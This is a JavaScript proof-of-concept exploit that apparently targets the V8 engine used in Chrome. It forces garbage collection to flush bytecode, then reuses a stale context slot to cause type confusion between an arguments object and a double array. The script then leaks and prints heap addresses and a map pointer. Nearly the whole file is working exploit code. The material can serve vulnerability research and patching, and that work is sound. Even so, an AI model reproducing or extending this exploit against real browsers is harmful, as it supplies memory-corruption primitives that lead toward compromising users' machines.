// slot offset starts from 2
let o0, o1, o2, o3, o4, o5, o6, o7, o8, o9, o10, o11, o12, o13, o14, o15, o16, o17, o18, o19, o20, o21, o22, o23, o24, o25, o26, o27, o28, o29, o30, o31, o32, o33, o34, o35, o36, o37, o38, o39, o40, o41, o42, o43, o44, o45, o46, o47, o48, o49, o50, o51, o52, o53, o54, o55, o56, o57, o58, o59, o60, o61, o62, o63, o64, o65, o66, o67, o68, o69, o70, o71, o72, o73, o74, o75, o76, o77, o78, o79, o80, o81, o82, o83, o84, o85, o86, o87, o88, o89, o90, o91, o92, o93, o94, o95, o96, o97, o98, o99, o100, o101, o102, o103, o104, o105, o106, o107, o108, o109, o110, o111, o112, o113, o114, o115, o116, o117, o118, o119, o120, o121, o122, o123, o124, o125, o126, o127, o128, o129, o130, o131, o132, o133, o134, o135, o136, o137, o138, o139, o140, o141, o142, o143, o144, o145, o146, o147, o148, o149, o150, o151, o152, o153, o154, o155, o156, o157, o158, o159, o160, o161, o162, o163, o164, o165, o166, o167, o168, o169, o170, o171, o172, o173, o174, o175, o176, o177, o178, o179, o180, o181, o182, o183, o184, o185, o186, o187, o188, o189, o190, o191, o192, o193, o194, o195, o196, o197, o198, o199, o200, o201, o202, o203, o204, o205, o206, o207, o208, o209, o210, o211, o212, o213, o214, o215, o216, o217, o218, o219, o220, o221, o222, o223, o224, o225, o226, o227, o228, o229, o230, o231, o232, o233, o234, o235, o236, o237, o238, o239, o240, o241, o242, o243, o244, o245, o246, o247, o248, o249, o250, o251, o252, o253, o254, o255, o256, o257, o258, o259, o260, o261, o262, o263, o264, o265, o266, o267, o268, o269, o270, o271, o272, o273, o274, o275, o276, o277, o278, o279, o280;

function gc_minor() { // scavenge
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() { // mark-sweep
  try {
    // doesn't seem to matter if the allocation fails
    new ArrayBuffer(0x7fe00000);
  } catch (err) {
    // print(err);
  }
}

// https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
function flush_bytecode() {
  // please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
  // you can observe if this is working by passing the "--trace-gc" flag
  const bytecode_old_age = 6;
  for (let i = 0; i < bytecode_old_age; i++) {
    gc_major();
  }
}


let arr_buf = new ArrayBuffer(8);
let f64_arr = new Float64Array(arr_buf);
let b64_arr = new BigInt64Array(arr_buf);

function ftoi(f) {
  f64_arr[0] = f;
  return b64_arr[0];
}

function itof(i) {
  b64_arr[0] = i;
  return f64_arr[0];
}

function f1() {
  function hax() {
    // o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS
    // o196 is JS_ARGUMENTS_OBJECT_TYPE map with PACKED_ELEMENTS
    // o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS
    o60 = o110;
  }

  (arg = class AAA {
    static {
      this;
    }
  }) => { }

  hax();
  return hax;
}

let hax = f1();

flush_bytecode();
console.log('after flush');

f1();

function hax2(a0) {
  %DebugPrint(arguments);
  return [ftoi(arguments[0]), ftoi(arguments[1]), ftoi(arguments[2])];
}

let arr = [1.1];
%DebugPrint(arr);
let leak = hax2(arr, 1, 1);
let [arr_addr, packed_double_map, fixed_arr_addr] = [leak[0] & 0xFFFFFFFFn, leak[1] >> 32n, leak[2] >> 32n];
console.log('arr addr: ' + arr_addr.toString(16));
console.log('packed_double_map addr: ' + packed_double_map.toString(16));
console.log('fixed_arr_addr addr: ' + fixed_arr_addr.toString(16));

// %SystemBreak();